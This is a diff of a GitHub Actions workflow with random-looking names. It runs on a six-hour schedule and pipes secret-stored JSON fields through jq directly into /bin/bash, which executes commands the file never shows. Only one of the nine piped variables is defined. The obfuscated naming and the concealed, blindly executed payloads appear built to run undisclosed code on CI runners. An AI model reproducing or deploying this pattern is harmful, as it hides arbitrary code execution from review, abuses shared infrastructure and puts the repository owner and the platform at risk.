@@ -1,25 +1,24 @@
 name: tonghugjiga
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
-jobs:  # 10306
+    - cron: '59 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tonghugjiga
         env:
-          wlqpj8568: ${{ secrets.wlqpj8568 }}
+          j05753: ${{ secrets.j05753 }}
         run: |
-          echo $wlqpj8568 | jq -r .a810 | /bin/bash
-          echo $tia221 | jq -r .bdql066 | /bin/bash
-          echo $z93 | jq -r .mfds06995 | /bin/bash
-          echo $bdmj20379 | jq -r .dvix088 | /bin/bash
-          echo $q8354 | jq -r .y457 | /bin/bash
-          echo $hnsr1 | jq -r .gskse07 | /bin/bash
-          echo $bd134 | jq -r .lviu751 | /bin/bash
-          echo $d9734 | jq -r .rtfu1526 | /bin/bash
+          echo $j05753 | jq -r .geqnl8 | /bin/bash
+          echo $pjgm29 | jq -r .s107 | /bin/bash
+          echo $gfttc0505 | jq -r .m25996 | /bin/bash
+          echo $pfxmu0299 | jq -r .brz397 | /bin/bash
+          echo $ft1793 | jq -r .nuqr2 | /bin/bash
+          echo $yq879 | jq -r .ouw489 | /bin/bash
+          echo $we10 | jq -r .ozwlr06384 | /bin/bash
+          echo $rkol797 | jq -r .vuw5 | /bin/bash
+          echo $iidvx7063 | jq -r .aart994 | /bin/bash
 
